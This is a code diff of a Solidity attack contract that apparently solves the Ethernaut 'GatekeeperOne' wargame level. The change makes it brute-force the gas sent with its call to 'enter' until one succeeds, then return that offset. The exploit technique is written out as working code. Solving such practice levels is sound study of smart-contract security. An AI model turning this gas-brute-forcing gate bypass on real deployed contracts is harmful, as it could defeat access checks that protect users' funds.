@@ -17,11 +17,12 @@ contract Solution {
         ad = tx.origin;
     }
 
-    function attack(address _target) public gateThree(_gatekey) {
+    function attack(address _target) public gateThree(_gatekey) returns (uint256) {
         GatekeeperOne target = GatekeeperOne(_target);
         bytes memory data = abi.encodeWithSignature("enter(bytes8)", _gatekey);
-        for (uint256 i = 0; i < 8191; i++) {
+        for (uint256 i = 400; i < 8191; i++) {
             (bool success,) = address(target).call{gas: 327640 + i}(data);
+            if (success) return i;
         }
     }
 }
